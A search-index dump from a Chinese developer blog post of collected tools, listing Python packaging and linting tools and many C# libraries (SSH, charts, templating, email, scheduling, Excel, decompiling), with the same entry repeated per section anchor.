README_zh.md Poetry Introduction | Documentation | Poetry - Python dependency management and packaging made easy Linter 格式化工具 GitHub - astral-sh/ruff: An extremely fast Python linter, written in Rust. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:3","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#python"},{"categories":["blog"],"content":" Python 打包 Astral · GitHub uv 会取代 rye. 但是现阶段 rye 更好用 这个机构下面还有 ruff PDM README_zh.md Poetry Introduction | Documentation | Poetry - Python dependency management and packaging made easy Linter 格式化工具 GitHub - astral-sh/ruff: An extremely fast Python linter, written in Rust. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:3","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#打包"},{"categories":["blog"],"content":" Python 打包 Astral · GitHub uv 会取代 rye. 但是现阶段 rye 更好用 这个机构下面还有 ruff PDM README_zh.md Poetry Introduction | Documentation | Poetry - Python dependency management and packaging made easy Linter 格式化工具 GitHub - astral-sh/ruff: An extremely fast Python linter, written in Rust. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:3","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#linter-格式化工具"},{"categories":["blog"],"content":" Csharpcsharp 工具收集 SSH 连接 GitHub - sshnet/SSH.NET: SSH.NET is a Secure Shell (SSH) library for .NET, optimized for parallelism. 参考 msb-om-scheduler 图表 类似 echarts 生成图表 GitHub - beto-rodriguez/LiveCharts2: Simple, flexible, interactive \u0026 powerful charts, maps and gauges for .Net, LiveCharts2 can now practically run everywhere Maui, Uno Platform, Blazor-wasm, WPF, WinForms, Xamarin, Avalonia, WinUI, UWP. 解析 html GitHub - AngleSharp 字符串模板 liquid GitHub - scriban/scriban: A fast, powerful, safe and lightweight scripting language and engine for .NET GitHub - sebastienros/fluid: Fluid is an open-source .NET template engine based on the Liquid template language. 支持多个编程语言, 主要是 js Handlebars-Net/Handlebars.Net: A real .NET Handlebars engine (github.com) 分析 dotnet 二进制文件大小 MichalStrehovsky/sizoscope: .NET tool to analyze size of Native AOT binaries. (github.com) 和 hez2010/sizoscopeX: .NET tool to analyze size of Native AOT binaries. (github.com) MAUI MASA MAUI Plugin （六）集成个推，实现本地消息推送[Android] 篇 - MASA 技术团队 - 博客园 (cnblogs. Com) .Net MAUI 安卓使用极光推送JPush(更新4.8.5) - 知乎 (zhihu.com) 邮件收发 GitHub - jstedfast/MimeKit: A .NET MIME creation and parser library with support for S/MIME, PGP, DKIM, TNEF and Unix mbox spools. 定时任务 GitHub - jamesmh/coravel: Near-zero config .NET library that makes advanced application features like Task Scheduling, Caching, Queuing, Event Broadcasting, and more a breeze! 导出入到 excel GitHub - mini-software/MiniExcel: Fast, Low-Memory, Easy Excel .NET helper to import/export/template spreadsheet 枚举转字符串 source-generator GitHub - andrewlock/NetEscapades.EnumGenerators: A source generator for generating fast “reflection” methods for enums Win 32 pinvoke已启用 源生成CsWin32 图片压缩 Compress Image Online | compressImage.io: 离线, 调整压缩比例 反编译 ILSpy GitHub - icsharpcode/ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (\u0026more) - cross-platform! 硬件 跨平台 USB 设备操作 LibUsbDotNet/LibUsbDotNet: My updates to LibUsbDotNet, an excellent library for cross-platform USB device control using Mono/.NET (github.com) 浏览器 在 dotnet 应用中集成 chrome 浏览器。可以加载页面，也可以用来执行 js GitHub - cefsharp/CefSharp: .NET (WPF and Windows Forms) bindings for the Chromium Embedded Framework 模拟数据 GitHub - nsubstitute/NSubstitute: A friendly substitute for .NET mocking libraries. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#csharp"},{"categories":["blog"],"content":" Csharpcsharp 工具收集 SSH 连接 GitHub - sshnet/SSH.NET: SSH.NET is a Secure Shell (SSH) library for .NET, optimized for parallelism. 参考 msb-om-scheduler 图表 类似 echarts 生成图表 GitHub - beto-rodriguez/LiveCharts2: Simple, flexible, interactive \u0026 powerful charts, maps and gauges for .Net, LiveCharts2 can now practically run everywhere Maui, Uno Platform, Blazor-wasm, WPF, WinForms, Xamarin, Avalonia, WinUI, UWP. 解析 html GitHub - AngleSharp 字符串模板 liquid GitHub - scriban/scriban: A fast, powerful, safe and lightweight scripting language and engine for .NET GitHub - sebastienros/fluid: Fluid is an open-source .NET template engine based on the Liquid template language. 支持多个编程语言, 主要是 js Handlebars-Net/Handlebars.Net: A real .NET Handlebars engine (github.com) 分析 dotnet 二进制文件大小 MichalStrehovsky/sizoscope: .NET tool to analyze size of Native AOT binaries. (github.com) 和 hez2010/sizoscopeX: .NET tool to analyze size of Native AOT binaries. (github.com) MAUI MASA MAUI Plugin （六）集成个推，实现本地消息推送[Android] 篇 - MASA 技术团队 - 博客园 (cnblogs. Com) .Net MAUI 安卓使用极光推送JPush(更新4.8.5) - 知乎 (zhihu.com) 邮件收发 GitHub - jstedfast/MimeKit: A .NET MIME creation and parser library with support for S/MIME, PGP, DKIM, TNEF and Unix mbox spools. 定时任务 GitHub - jamesmh/coravel: Near-zero config .NET library that makes advanced application features like Task Scheduling, Caching, Queuing, Event Broadcasting, and more a breeze! 导出入到 excel GitHub - mini-software/MiniExcel: Fast, Low-Memory, Easy Excel .NET helper to import/export/template spreadsheet 枚举转字符串 source-generator GitHub - andrewlock/NetEscapades.EnumGenerators: A source generator for generating fast “reflection” methods for enums Win 32 pinvoke已启用 源生成CsWin32 图片压缩 Compress Image Online | compressImage.io: 离线, 调整压缩比例 反编译 ILSpy GitHub - icsharpcode/ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (\u0026more) - cross-platform! 硬件 跨平台 USB 设备操作 LibUsbDotNet/LibUsbDotNet: My updates to LibUsbDotNet, an excellent library for cross-platform USB device control using Mono/.NET (github.com) 浏览器 在 dotnet 应用中集成 chrome 浏览器。可以加载页面，也可以用来执行 js GitHub - cefsharp/CefSharp: .NET (WPF and Windows Forms) bindings for the Chromium Embedded Framework 模拟数据 GitHub - nsubstitute/NSubstitute: A friendly substitute for .NET mocking libraries. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#ssh-连接"},{"categories":["blog"],"content":" Csharpcsharp 工具收集 SSH 连接 GitHub - sshnet/SSH.NET: SSH.NET is a Secure Shell (SSH) library for .NET, optimized for parallelism. 参考 msb-om-scheduler 图表 类似 echarts 生成图表 GitHub - beto-rodriguez/LiveCharts2: Simple, flexible, interactive \u0026 powerful charts, maps and gauges for .Net, LiveCharts2 can now practically run everywhere Maui, Uno Platform, Blazor-wasm, WPF, WinForms, Xamarin, Avalonia, WinUI, UWP. 解析 html GitHub - AngleSharp 字符串模板 liquid GitHub - scriban/scriban: A fast, powerful, safe and lightweight scripting language and engine for .NET GitHub - sebastienros/fluid: Fluid is an open-source .NET template engine based on the Liquid template language. 支持多个编程语言, 主要是 js Handlebars-Net/Handlebars.Net: A real .NET Handlebars engine (github.com) 分析 dotnet 二进制文件大小 MichalStrehovsky/sizoscope: .NET tool to analyze size of Native AOT binaries. (github.com) 和 hez2010/sizoscopeX: .NET tool to analyze size of Native AOT binaries. (github.com) MAUI MASA MAUI Plugin （六）集成个推，实现本地消息推送[Android] 篇 - MASA 技术团队 - 博客园 (cnblogs. Com) .Net MAUI 安卓使用极光推送JPush(更新4.8.5) - 知乎 (zhihu.com) 邮件收发 GitHub - jstedfast/MimeKit: A .NET MIME creation and parser library with support for S/MIME, PGP, DKIM, TNEF and Unix mbox spools. 定时任务 GitHub - jamesmh/coravel: Near-zero config .NET library that makes advanced application features like Task Scheduling, Caching, Queuing, Event Broadcasting, and more a breeze! 导出入到 excel GitHub - mini-software/MiniExcel: Fast, Low-Memory, Easy Excel .NET helper to import/export/template spreadsheet 枚举转字符串 source-generator GitHub - andrewlock/NetEscapades.EnumGenerators: A source generator for generating fast “reflection” methods for enums Win 32 pinvoke已启用 源生成CsWin32 图片压缩 Compress Image Online | compressImage.io: 离线, 调整压缩比例 反编译 ILSpy GitHub - icsharpcode/ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (\u0026more) - cross-platform! 硬件 跨平台 USB 设备操作 LibUsbDotNet/LibUsbDotNet: My updates to LibUsbDotNet, an excellent library for cross-platform USB device control using Mono/.NET (github.com) 浏览器 在 dotnet 应用中集成 chrome 浏览器。可以加载页面，也可以用来执行 js GitHub - cefsharp/CefSharp: .NET (WPF and Windows Forms) bindings for the Chromium Embedded Framework 模拟数据 GitHub - nsubstitute/NSubstitute: A friendly substitute for .NET mocking libraries. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#图表"},{"categories":["blog"],"content":" Csharpcsharp 工具收集 SSH 连接 GitHub - sshnet/SSH.NET: SSH.NET is a Secure Shell (SSH) library for .NET, optimized for parallelism. 参考 msb-om-scheduler 图表 类似 echarts 生成图表 GitHub - beto-rodriguez/LiveCharts2: Simple, flexible, interactive \u0026 powerful charts, maps and gauges for .Net, LiveCharts2 can now practically run everywhere Maui, Uno Platform, Blazor-wasm, WPF, WinForms, Xamarin, Avalonia, WinUI, UWP. 解析 html GitHub - AngleSharp 字符串模板 liquid GitHub - scriban/scriban: A fast, powerful, safe and lightweight scripting language and engine for .NET GitHub - sebastienros/fluid: Fluid is an open-source .NET template engine based on the Liquid template language. 支持多个编程语言, 主要是 js Handlebars-Net/Handlebars.Net: A real .NET Handlebars engine (github.com) 分析 dotnet 二进制文件大小 MichalStrehovsky/sizoscope: .NET tool to analyze size of Native AOT binaries. (github.com) 和 hez2010/sizoscopeX: .NET tool to analyze size of Native AOT binaries. (github.com) MAUI MASA MAUI Plugin （六）集成个推，实现本地消息推送[Android] 篇 - MASA 技术团队 - 博客园 (cnblogs. Com) .Net MAUI 安卓使用极光推送JPush(更新4.8.5) - 知乎 (zhihu.com) 邮件收发 GitHub - jstedfast/MimeKit: A .NET MIME creation and parser library with support for S/MIME, PGP, DKIM, TNEF and Unix mbox spools. 定时任务 GitHub - jamesmh/coravel: Near-zero config .NET library that makes advanced application features like Task Scheduling, Caching, Queuing, Event Broadcasting, and more a breeze! 导出入到 excel GitHub - mini-software/MiniExcel: Fast, Low-Memory, Easy Excel .NET helper to import/export/template spreadsheet 枚举转字符串 source-generator GitHub - andrewlock/NetEscapades.EnumGenerators: A source generator for generating fast “reflection” methods for enums Win 32 pinvoke已启用 源生成CsWin32 图片压缩 Compress Image Online | compressImage.io: 离线, 调整压缩比例 反编译 ILSpy GitHub - icsharpcode/ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (\u0026more) - cross-platform! 硬件 跨平台 USB 设备操作 LibUsbDotNet/LibUsbDotNet: My updates to LibUsbDotNet, an excellent library for cross-platform USB device control using Mono/.NET (github.com) 浏览器 在 dotnet 应用中集成 chrome 浏览器。可以加载页面，也可以用来执行 js GitHub - cefsharp/CefSharp: .NET (WPF and Windows Forms) bindings for the Chromium Embedded Framework 模拟数据 GitHub - nsubstitute/NSubstitute: A friendly substitute for .NET mocking libraries. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#解析-html"},{"categories":["blog"],"content":" Csharpcsharp 工具收集 SSH 连接 GitHub - sshnet/SSH.NET: SSH.NET is a Secure Shell (SSH) library for .NET, optimized for parallelism. 参考 msb-om-scheduler 图表 类似 echarts 生成图表 GitHub - beto-rodriguez/LiveCharts2: Simple, flexible, interactive \u0026 powerful charts, maps and gauges for .Net, LiveCharts2 can now practically run everywhere Maui, Uno Platform, Blazor-wasm, WPF, WinForms, Xamarin, Avalonia, WinUI, UWP. 解析 html GitHub - AngleSharp 字符串模板 liquid GitHub - scriban/scriban: A fast, powerful, safe and lightweight scripting language and engine for .NET GitHub - sebastienros/fluid: Fluid is an open-source .NET template engine based on the Liquid template language. 支持多个编程语言, 主要是 js Handlebars-Net/Handlebars.Net: A real .NET Handlebars engine (github.com) 分析 dotnet 二进制文件大小 MichalStrehovsky/sizoscope: .NET tool to analyze size of Native AOT binaries. (github.com) 和 hez2010/sizoscopeX: .NET tool to analyze size of Native AOT binaries. (github.com) MAUI MASA MAUI Plugin （六）集成个推，实现本地消息推送[Android] 篇 - MASA 技术团队 - 博客园 (cnblogs. Com) .Net MAUI 安卓使用极光推送JPush(更新4.8.5) - 知乎 (zhihu.com) 邮件收发 GitHub - jstedfast/MimeKit: A .NET MIME creation and parser library with support for S/MIME, PGP, DKIM, TNEF and Unix mbox spools. 定时任务 GitHub - jamesmh/coravel: Near-zero config .NET library that makes advanced application features like Task Scheduling, Caching, Queuing, Event Broadcasting, and more a breeze! 导出入到 excel GitHub - mini-software/MiniExcel: Fast, Low-Memory, Easy Excel .NET helper to import/export/template spreadsheet 枚举转字符串 source-generator GitHub - andrewlock/NetEscapades.EnumGenerators: A source generator for generating fast “reflection” methods for enums Win 32 pinvoke已启用 源生成CsWin32 图片压缩 Compress Image Online | compressImage.io: 离线, 调整压缩比例 反编译 ILSpy GitHub - icsharpcode/ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (\u0026more) - cross-platform! 硬件 跨平台 USB 设备操作 LibUsbDotNet/LibUsbDotNet: My updates to LibUsbDotNet, an excellent library for cross-platform USB device control using Mono/.NET (github.com) 浏览器 在 dotnet 应用中集成 chrome 浏览器。可以加载页面，也可以用来执行 js GitHub - cefsharp/CefSharp: .NET (WPF and Windows Forms) bindings for the Chromium Embedded Framework 模拟数据 GitHub - nsubstitute/NSubstitute: A friendly substitute for .NET mocking libraries. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#字符串模板"},{"categories":["blog"],"content":" Csharpcsharp 工具收集 SSH 连接 GitHub - sshnet/SSH.NET: SSH.NET is a Secure Shell (SSH) library for .NET, optimized for parallelism. 参考 msb-om-scheduler 图表 类似 echarts 生成图表 GitHub - beto-rodriguez/LiveCharts2: Simple, flexible, interactive \u0026 powerful charts, maps and gauges for .Net, LiveCharts2 can now practically run everywhere Maui, Uno Platform, Blazor-wasm, WPF, WinForms, Xamarin, Avalonia, WinUI, UWP. 解析 html GitHub - AngleSharp 字符串模板 liquid GitHub - scriban/scriban: A fast, powerful, safe and lightweight scripting language and engine for .NET GitHub - sebastienros/fluid: Fluid is an open-source .NET template engine based on the Liquid template language. 支持多个编程语言, 主要是 js Handlebars-Net/Handlebars.Net: A real .NET Handlebars engine (github.com) 分析 dotnet 二进制文件大小 MichalStrehovsky/sizoscope: .NET tool to analyze size of Native AOT binaries. (github.com) 和 hez2010/sizoscopeX: .NET tool to analyze size of Native AOT binaries. (github.com) MAUI MASA MAUI Plugin （六）集成个推，实现本地消息推送[Android] 篇 - MASA 技术团队 - 博客园 (cnblogs. Com) .Net MAUI 安卓使用极光推送JPush(更新4.8.5) - 知乎 (zhihu.com) 邮件收发 GitHub - jstedfast/MimeKit: A .NET MIME creation and parser library with support for S/MIME, PGP, DKIM, TNEF and Unix mbox spools. 定时任务 GitHub - jamesmh/coravel: Near-zero config .NET library that makes advanced application features like Task Scheduling, Caching, Queuing, Event Broadcasting, and more a breeze! 导出入到 excel GitHub - mini-software/MiniExcel: Fast, Low-Memory, Easy Excel .NET helper to import/export/template spreadsheet 枚举转字符串 source-generator GitHub - andrewlock/NetEscapades.EnumGenerators: A source generator for generating fast “reflection” methods for enums Win 32 pinvoke已启用 源生成CsWin32 图片压缩 Compress Image Online | compressImage.io: 离线, 调整压缩比例 反编译 ILSpy GitHub - icsharpcode/ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (\u0026more) - cross-platform! 硬件 跨平台 USB 设备操作 LibUsbDotNet/LibUsbDotNet: My updates to LibUsbDotNet, an excellent library for cross-platform USB device control using Mono/.NET (github.com) 浏览器 在 dotnet 应用中集成 chrome 浏览器。可以加载页面，也可以用来执行 js GitHub - cefsharp/CefSharp: .NET (WPF and Windows Forms) bindings for the Chromium Embedded Framework 模拟数据 GitHub - nsubstitute/NSubstitute: A friendly substitute for .NET mocking libraries. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#分析-dotnet-二进制文件大小"},{"categories":["blog"],"content":" Csharpcsharp 工具收集 SSH 连接 GitHub - sshnet/SSH.NET: SSH.NET is a Secure Shell (SSH) library for .NET, optimized for parallelism. 参考 msb-om-scheduler 图表 类似 echarts 生成图表 GitHub - beto-rodriguez/LiveCharts2: Simple, flexible, interactive \u0026 powerful charts, maps and gauges for .Net, LiveCharts2 can now practically run everywhere Maui, Uno Platform, Blazor-wasm, WPF, WinForms, Xamarin, Avalonia, WinUI, UWP. 解析 html GitHub - AngleSharp 字符串模板 liquid GitHub - scriban/scriban: A fast, powerful, safe and lightweight scripting language and engine for .NET GitHub - sebastienros/fluid: Fluid is an open-source .NET template engine based on the Liquid template language. 支持多个编程语言, 主要是 js Handlebars-Net/Handlebars.Net: A real .NET Handlebars engine (github.com) 分析 dotnet 二进制文件大小 MichalStrehovsky/sizoscope: .NET tool to analyze size of Native AOT binaries. (github.com) 和 hez2010/sizoscopeX: .NET tool to analyze size of Native AOT binaries. (github.com) MAUI MASA MAUI Plugin （六）集成个推，实现本地消息推送[Android] 篇 - MASA 技术团队 - 博客园 (cnblogs. Com) .Net MAUI 安卓使用极光推送JPush(更新4.8.5) - 知乎 (zhihu.com) 邮件收发 GitHub - jstedfast/MimeKit: A .NET MIME creation and parser library with support for S/MIME, PGP, DKIM, TNEF and Unix mbox spools. 定时任务 GitHub - jamesmh/coravel: Near-zero config .NET library that makes advanced application features like Task Scheduling, Caching, Queuing, Event Broadcasting, and more a breeze! 导出入到 excel GitHub - mini-software/MiniExcel: Fast, Low-Memory, Easy Excel .NET helper to import/export/template spreadsheet 枚举转字符串 source-generator GitHub - andrewlock/NetEscapades.EnumGenerators: A source generator for generating fast “reflection” methods for enums Win 32 pinvoke已启用 源生成CsWin32 图片压缩 Compress Image Online | compressImage.io: 离线, 调整压缩比例 反编译 ILSpy GitHub - icsharpcode/ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (\u0026more) - cross-platform! 硬件 跨平台 USB 设备操作 LibUsbDotNet/LibUsbDotNet: My updates to LibUsbDotNet, an excellent library for cross-platform USB device control using Mono/.NET (github.com) 浏览器 在 dotnet 应用中集成 chrome 浏览器。可以加载页面，也可以用来执行 js GitHub - cefsharp/CefSharp: .NET (WPF and Windows Forms) bindings for the Chromium Embedded Framework 模拟数据 GitHub - nsubstitute/NSubstitute: A friendly substitute for .NET mocking libraries. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#maui"},{"categories":["blog"],"content":" Csharpcsharp 工具收集 SSH 连接 GitHub - sshnet/SSH.NET: SSH.NET is a Secure Shell (SSH) library for .NET, optimized for parallelism. 参考 msb-om-scheduler 图表 类似 echarts 生成图表 GitHub - beto-rodriguez/LiveCharts2: Simple, flexible, interactive \u0026 powerful charts, maps and gauges for .Net, LiveCharts2 can now practically run everywhere Maui, Uno Platform, Blazor-wasm, WPF, WinForms, Xamarin, Avalonia, WinUI, UWP. 解析 html GitHub - AngleSharp 字符串模板 liquid GitHub - scriban/scriban: A fast, powerful, safe and lightweight scripting language and engine for .NET GitHub - sebastienros/fluid: Fluid is an open-source .NET template engine based on the Liquid template language. 支持多个编程语言, 主要是 js Handlebars-Net/Handlebars.Net: A real .NET Handlebars engine (github.com) 分析 dotnet 二进制文件大小 MichalStrehovsky/sizoscope: .NET tool to analyze size of Native AOT binaries. (github.com) 和 hez2010/sizoscopeX: .NET tool to analyze size of Native AOT binaries. (github.com) MAUI MASA MAUI Plugin （六）集成个推，实现本地消息推送[Android] 篇 - MASA 技术团队 - 博客园 (cnblogs. Com) .Net MAUI 安卓使用极光推送JPush(更新4.8.5) - 知乎 (zhihu.com) 邮件收发 GitHub - jstedfast/MimeKit: A .NET MIME creation and parser library with support for S/MIME, PGP, DKIM, TNEF and Unix mbox spools. 定时任务 GitHub - jamesmh/coravel: Near-zero config .NET library that makes advanced application features like Task Scheduling, Caching, Queuing, Event Broadcasting, and more a breeze! 导出入到 excel GitHub - mini-software/MiniExcel: Fast, Low-Memory, Easy Excel .NET helper to import/export/template spreadsheet 枚举转字符串 source-generator GitHub - andrewlock/NetEscapades.EnumGenerators: A source generator for generating fast “reflection” methods for enums Win 32 pinvoke已启用 源生成CsWin32 图片压缩 Compress Image Online | compressImage.io: 离线, 调整压缩比例 反编译 ILSpy GitHub - icsharpcode/ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (\u0026more) - cross-platform! 硬件 跨平台 USB 设备操作 LibUsbDotNet/LibUsbDotNet: My updates to LibUsbDotNet, an excellent library for cross-platform USB device control using Mono/.NET (github.com) 浏览器 在 dotnet 应用中集成 chrome 浏览器。可以加载页面，也可以用来执行 js GitHub - cefsharp/CefSharp: .NET (WPF and Windows Forms) bindings for the Chromium Embedded Framework 模拟数据 GitHub - nsubstitute/NSubstitute: A friendly substitute for .NET mocking libraries. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#邮件收发"},{"categories":["blog"],"content":" Csharpcsharp 工具收集 SSH 连接 GitHub - sshnet/SSH.NET: SSH.NET is a Secure Shell (SSH) library for .NET, optimized for parallelism. 参考 msb-om-scheduler 图表 类似 echarts 生成图表 GitHub - beto-rodriguez/LiveCharts2: Simple, flexible, interactive \u0026 powerful charts, maps and gauges for .Net, LiveCharts2 can now practically run everywhere Maui, Uno Platform, Blazor-wasm, WPF, WinForms, Xamarin, Avalonia, WinUI, UWP. 解析 html GitHub - AngleSharp 字符串模板 liquid GitHub - scriban/scriban: A fast, powerful, safe and lightweight scripting language and engine for .NET GitHub - sebastienros/fluid: Fluid is an open-source .NET template engine based on the Liquid template language. 支持多个编程语言, 主要是 js Handlebars-Net/Handlebars.Net: A real .NET Handlebars engine (github.com) 分析 dotnet 二进制文件大小 MichalStrehovsky/sizoscope: .NET tool to analyze size of Native AOT binaries. (github.com) 和 hez2010/sizoscopeX: .NET tool to analyze size of Native AOT binaries. (github.com) MAUI MASA MAUI Plugin （六）集成个推，实现本地消息推送[Android] 篇 - MASA 技术团队 - 博客园 (cnblogs. Com) .Net MAUI 安卓使用极光推送JPush(更新4.8.5) - 知乎 (zhihu.com) 邮件收发 GitHub - jstedfast/MimeKit: A .NET MIME creation and parser library with support for S/MIME, PGP, DKIM, TNEF and Unix mbox spools. 定时任务 GitHub - jamesmh/coravel: Near-zero config .NET library that makes advanced application features like Task Scheduling, Caching, Queuing, Event Broadcasting, and more a breeze! 导出入到 excel GitHub - mini-software/MiniExcel: Fast, Low-Memory, Easy Excel .NET helper to import/export/template spreadsheet 枚举转字符串 source-generator GitHub - andrewlock/NetEscapades.EnumGenerators: A source generator for generating fast “reflection” methods for enums Win 32 pinvoke已启用 源生成CsWin32 图片压缩 Compress Image Online | compressImage.io: 离线, 调整压缩比例 反编译 ILSpy GitHub - icsharpcode/ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (\u0026more) - cross-platform! 硬件 跨平台 USB 设备操作 LibUsbDotNet/LibUsbDotNet: My updates to LibUsbDotNet, an excellent library for cross-platform USB device control using Mono/.NET (github.com) 浏览器 在 dotnet 应用中集成 chrome 浏览器。可以加载页面，也可以用来执行 js GitHub - cefsharp/CefSharp: .NET (WPF and Windows Forms) bindings for the Chromium Embedded Framework 模拟数据 GitHub - nsubstitute/NSubstitute: A friendly substitute for .NET mocking libraries. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#定时任务"},{"categories":["blog"],"content":" Csharpcsharp 工具收集 SSH 连接 GitHub - sshnet/SSH.NET: SSH.NET is a Secure Shell (SSH) library for .NET, optimized for parallelism. 参考 msb-om-scheduler 图表 类似 echarts 生成图表 GitHub - beto-rodriguez/LiveCharts2: Simple, flexible, interactive \u0026 powerful charts, maps and gauges for .Net, LiveCharts2 can now practically run everywhere Maui, Uno Platform, Blazor-wasm, WPF, WinForms, Xamarin, Avalonia, WinUI, UWP. 解析 html GitHub - AngleSharp 字符串模板 liquid GitHub - scriban/scriban: A fast, powerful, safe and lightweight scripting language and engine for .NET GitHub - sebastienros/fluid: Fluid is an open-source .NET template engine based on the Liquid template language. 支持多个编程语言, 主要是 js Handlebars-Net/Handlebars.Net: A real .NET Handlebars engine (github.com) 分析 dotnet 二进制文件大小 MichalStrehovsky/sizoscope: .NET tool to analyze size of Native AOT binaries. (github.com) 和 hez2010/sizoscopeX: .NET tool to analyze size of Native AOT binaries. (github.com) MAUI MASA MAUI Plugin （六）集成个推，实现本地消息推送[Android] 篇 - MASA 技术团队 - 博客园 (cnblogs. Com) .Net MAUI 安卓使用极光推送JPush(更新4.8.5) - 知乎 (zhihu.com) 邮件收发 GitHub - jstedfast/MimeKit: A .NET MIME creation and parser library with support for S/MIME, PGP, DKIM, TNEF and Unix mbox spools. 定时任务 GitHub - jamesmh/coravel: Near-zero config .NET library that makes advanced application features like Task Scheduling, Caching, Queuing, Event Broadcasting, and more a breeze! 导出入到 excel GitHub - mini-software/MiniExcel: Fast, Low-Memory, Easy Excel .NET helper to import/export/template spreadsheet 枚举转字符串 source-generator GitHub - andrewlock/NetEscapades.EnumGenerators: A source generator for generating fast “reflection” methods for enums Win 32 pinvoke已启用 源生成CsWin32 图片压缩 Compress Image Online | compressImage.io: 离线, 调整压缩比例 反编译 ILSpy GitHub - icsharpcode/ILSpy: .NET Decompiler with support for PDB generation, ReadyToRun, Metadata (\u0026more) - cross-platform! 硬件 跨平台 USB 设备操作 LibUsbDotNet/LibUsbDotNet: My updates to LibUsbDotNet, an excellent library for cross-platform USB device control using Mono/.NET (github.com) 浏览器 在 dotnet 应用中集成 chrome 浏览器。可以加载页面，也可以用来执行 js GitHub - cefsharp/CefSharp: .NET (WPF and Windows Forms) bindings for the Chromium Embedded Framework 模拟数据 GitHub - nsubstitute/NSubstitute: A friendly substitute for .NET mocking libraries. ","date":"2023-07-07","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/:3:4","series":null,"tags":["blog","tools"],"title":"工具收集","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/#导出入到-excel"},{"categories":["blog"],"content":" Csharpcsharp 工具收集 SSH 连接 GitHub - sshnet/SSH.NET: SSH.NET is a Secure Shell (SSH) library for .NET, optimized for parallelism. 参考 msb-om-scheduler 图表 类似 echarts 生成图表 GitHub - beto-rodriguez/LiveCharts2: Simple, flexible, interactive \u0026 powerful charts, maps and gauges for .Net, LiveCharts2 can now practically run everywhere Maui, Uno Platform, Blazor-wasm, WPF, WinForms, Xamarin, Avalonia, WinUI, UWP. 解析 html GitHub - AngleSharp 字符串模板 liquid GitHub - scriban/scriban: A fast, powerful, safe and lightweight scripting language and engine for .NET GitHub - sebastienros/fluid: Fluid is an open-source .NET template engine based on the Liquid template language. 支持多个编程语言, 主要是 js Handlebars-Net/Handlebars.Net: A real .NET 